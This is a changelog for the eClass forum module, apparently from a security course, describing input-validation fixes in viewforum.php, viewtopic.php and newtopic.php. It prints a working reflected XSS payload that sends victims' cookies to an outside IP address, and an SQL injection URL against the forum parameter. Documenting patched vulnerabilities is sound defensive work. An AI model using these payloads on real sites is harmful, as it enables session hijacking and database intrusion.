# Changelog for eClass

### Changes in /module/phbb/
#### viewforum.php && viewtopic.php
  * Added checking if $_GET['forum'] is a number and complies with the UTF-8 standard lines 75 - 81. This should prevent this page from sql injections as well as non persistent XSS attacks
  * possible XSS attack
  ``` javascript  
  http://geza.csec.gr/modules/phpbb/viewforum.php?forum=
  <script>window.onload=function() {
  console.log('hey');
  var logo = document.getElementById("logo");
  var link = "http://195.134.67.223:8095?";
  var cookie = document.cookie.split(";");
  link = link.concat(cookie);
  logo.href=link;
  }</script>
  ```  

#### newtopic.php
  * We can have injections here from $_GET['forum'] attribute. More specifically if we send non numeric values through the $_GET we have an sql error reporting rendered. This is wrong.
  We added lines 83-91 in order to be sure that the input incoming from the $_GET['forum'] is correct and we suppressed the sql error output  
   ** hint ** sql possible injection here http://geza.csec.gr/modules/phpbb/newtopic.php?forum=1%27%20%20or%20%27a%27

  * The above xss attack can be used here
